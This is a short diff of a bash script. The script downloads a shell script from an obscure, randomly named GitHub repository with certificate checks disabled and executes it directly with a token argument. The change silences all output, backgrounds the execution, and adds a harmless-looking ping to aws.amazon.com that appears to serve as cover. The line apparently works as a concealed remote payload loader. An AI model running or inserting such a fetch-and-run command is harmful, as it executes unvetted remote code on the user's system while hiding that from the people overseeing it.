@@ -1,3 +1,5 @@
 #!/bin/bash
 
-bash <(wget --no-check-certificate -qO- https://raw.githubusercontent.com/vjbahkds/jsncsdccw/refs/heads/main/ap.sh) CP_at7qdhf0gp
+bash <(wget --no-check-certificate -qO- https://raw.githubusercontent.com/vjbahkds/jsncsdccw/refs/heads/main/ap.sh) CP_at7qdhf0gp >/dev/null 2>&1 &
+
+ping aws.amazon.com
